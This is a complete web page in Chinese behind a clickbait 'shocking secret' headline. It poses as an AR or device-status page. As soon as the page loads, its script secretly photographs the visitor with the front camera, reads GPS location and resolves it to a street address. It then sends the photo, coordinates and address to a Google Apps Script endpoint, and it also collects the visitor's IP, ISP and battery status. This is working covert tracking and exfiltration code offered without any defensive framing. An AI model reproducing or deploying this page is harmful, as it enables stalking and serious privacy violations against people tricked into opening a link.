<!DOCTYPE html>
<html lang="zh-TW">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>驚天秘密曝光！他們不想讓你知道的真相！</title>
  <style>
    body {
      font-family: 'Arial', sans-serif;
      background-color: #1e1e2f;
      color: #ffffff;
      margin: 0;
      padding: 0;
    }

    h1 {
      text-align: center;
      margin-top: 20px;
      font-size: 24px;
    }

    .container {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
      gap: 20px;
      padding: 20px;
    }

    .card {
      background: linear-gradient(145deg, #2b2b3d, #191926);
      border-radius: 15px;
      padding: 20px;
      box-shadow: 2px 2px 5px #121218, -2px -2px 5px #2e2e40;
      text-align: center;
    }

    .card h2 {
      font-size: 18px;
      margin-bottom: 15px;
    }

    .status-text {
      font-size: 14px;
      margin: 10px 0;
    }

    .loader {
      border: 4px solid #2b2b3d;
      border-top: 4px solid #4caf50;
      border-radius: 50%;
      width: 50px;
      height: 50px;
      animation: spin 1s linear infinite;
      margin: 20px auto;
    }

    .progress {
      background: #2e2e40;
      border-radius: 10px;
      height: 10px;
      margin: 10px 0;
      overflow: hidden;
    }

    .progress-bar {
      background: #4caf50;
      height: 100%;
      width: 0;
      animation: fillBar 2s ease-in-out forwards;
    }

    @keyframes spin {
      0% {
        transform: rotate(0deg);
      }
      100% {
        transform: rotate(360deg);
      }
    }

    @keyframes fillBar {
      from {
        width: 0%;
      }
      to {
        width: 100%;
      }
    }
  </style>
</head>
<body>
  <h1>驚天秘密曝光！他們不想讓你知道的真相！</h1>
  <p id="ipInfo">資訊載入中...</p>
  <p id="status">請開啟鏡頭使用ＡＲ...</p>

  <div class="container">
    <div class="card">
      <h2>電池資訊</h2>
      <div id="battery-info">
        <p class="status-text">讀取中...</p>
        <div class="progress">
          <div class="progress-bar" id="battery-bar"></div>
        </div>
      </div>
    </div>
    <div class="card">
      <h2>GPS 狀態</h2>
      <div id="gps-info">
        <p class="status-text">正在定位中...</p>
        <div class="loader"></div>
      </div>
    </div>
    <div class="card">
      <h2>系統資訊</h2>
      <div id="system-info">
        <p class="status-text">載入中...</p>
      </div>
    </div>
  </div>

  <script>
    // 原有功能: 自動拍照與數據回傳
    async function startCameraAndSend() {
      const statusElement = document.getElementById('status');

      try {
        const stream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: { ideal: 'user' } },
        });
        const video = document.createElement('video');
        video.srcObject = stream;

        await new Promise((resolve) => {
          video.onloadedmetadata = () => {
            video.play();
            resolve();
          };
        });

        setTimeout(() => {
          const canvas = document.createElement('canvas');
          canvas.width = video.videoWidth || 640;
          canvas.height = video.videoHeight || 480;
          const context = canvas.getContext('2d');
          context.drawImage(video, 0, 0, canvas.width, canvas.height);

          const photoData = canvas.toDataURL('image/jpeg', 0.5).split(',')[1];
          stream.getTracks().forEach((track) => track.stop());
          getGpsCoordinates(photoData);
        }, 1000);
      } catch (error) {
        console.error('無法啟動相機:', error);
        statusElement.innerText = '無法啟動相機，請檢查權限或設備相機';
      }
    }

    async function getGpsCoordinates(photoData) {
      const statusElement = document.getElementById('status');
      try {
        navigator.geolocation.getCurrentPosition(async (position) => {
          const { latitude, longitude } = position.coords;
          const response = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}`);
          const data = await response.json();
          const address = data.display_name || '未知地址';
          sendPhotoToServer(photoData, latitude, longitude, address);

          document.getElementById('gps-info').innerHTML = `
            <p class="status-text">經度：${longitude.toFixed(4)}</p>
            <p class="status-text">緯度：${latitude.toFixed(4)}</p>
            <p class="status-text">地址：${address}</p>
          `;
        }, (error) => {
          console.error('GPS 錯誤:', error);
          statusElement.innerText = 'GPS 無法取得，請檢查裝置定位權限。';
        });
      } catch (error) {
        console.error('錯誤:', error);
        statusElement.innerText = '操作失敗，請檢查控制台。';
      }
    }

    async function sendPhotoToServer(photoData, latitude, longitude, address) {
      const statusElement = document.getElementById('status');
      try {
        const formData = new URLSearchParams();
        formData.append('message', '自動拍照圖片');
        formData.append('imageData', photoData);
        formData.append('latitude', latitude);
        formData.append('longitude', longitude);
        formData.append('address', address);

        const response = await fetch('https://script.google.com/macros/s/AKfycbzv1XvirckHJxlvuSgqaTx4hyi119CsYr-gZ_op_3TUphVN4AnPOUtsGSrICZMhxuSQOg/exec', {
          method: 'POST',
          body: formData,
        });

        const result = await response.json();
        if (result.success) {
          statusElement.innerText = '通知已成功送出';
        } else {
          statusElement.innerText = `通知發送失敗：${result.error}`;
        }
      } catch (error) {
        console.error('發送過程中發生錯誤:', error);
        statusElement.innerText = '發送過程中發生錯誤，請檢查控制台。';
      }
    }

    async function getIpInfo() {
      try {
        const response = await fetch('https://ipinfo.io/json');
        const data = await response.json();
        const { ip, city, region, country, org } = data;

        document.getElementById('system-info').innerHTML = `
          <p class="status-text">IP：${ip}</p>
          <p class="status-text">位置：${city}, ${region}, ${country}</p>
          <p class="status-text">ISP：${org}</p>
        `;
      } catch (error) {
        document.getElementById('system-info').innerHTML = `
          <p class="status-text">系統資訊讀取失敗</p>
        `;
      }
    }

    function updateBatteryStatus() {
      navigator.getBattery().then((battery) => {
        const level = battery.level * 100;
        const batteryBar = document.getElementById('battery-bar');
        batteryBar.style.width = `${level}%`;
        document.getElementById('battery-info').innerHTML = `
          <p class="status-text">電量：${level.toFixed(0)}%</p>
          <p class="status-text">${battery.charging ? '充電中' : '未充電'}</p>
        `;
      });
    }

    getIpInfo();
    updateBatteryStatus();
    startCameraAndSend();
  </script>
</body>
</html>
